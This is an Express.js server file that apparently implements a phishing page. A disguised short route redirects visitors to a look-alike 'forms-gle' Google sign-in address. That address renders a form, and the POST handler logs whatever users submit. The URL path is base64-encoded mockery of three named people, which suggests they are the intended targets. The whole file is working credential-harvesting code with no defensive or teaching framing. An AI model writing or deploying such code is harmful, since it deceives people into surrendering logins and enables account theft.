import express from "express";
import morgan from "morgan";
import helmet from "helmet";
import bodyParser from "body-parser";
import favicon from "serve-favicon";
import path from "path";
import "dotenv/config";

const app = express();
const PORT = process.env.PORT;
const logger = morgan("dev");
const __dirname = path.resolve();

app.use(helmet());
app.use(logger);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set('view engine', 'pug');
app.set("views", './views');
app.use('/assets', express.static(__dirname + '/assets'));
app.use(favicon(path.join(__dirname, 'assets', 'favicon.ico')));

app.get("/fjXw1vaAQwzGFyJG7", (req, res) => {
    return res.redirect("https://forms-gle.herokuapp.com/v3/signin/TGVlIEplb25nLXdvb2sgRm9vbCBTaGluIEt3b24gSG8gRm9vbCBKdW5nIEphZS1ob29uIEZvb2w=")
});

app.route("/v3/signin/TGVlIEplb25nLXdvb2sgRm9vbCBTaGluIEt3b24gSG8gRm9vbCBKdW5nIEphZS1ob29uIEZvb2w=").get((req, res) => {
    return res.render('form');
}).post(async (req, res) => {
    const data = req.body;
    console.log(data);
    return res.send("good");
})

app.listen(PORT, () => {
    console.log(`Server is listening http://localhost:${PORT}`)
})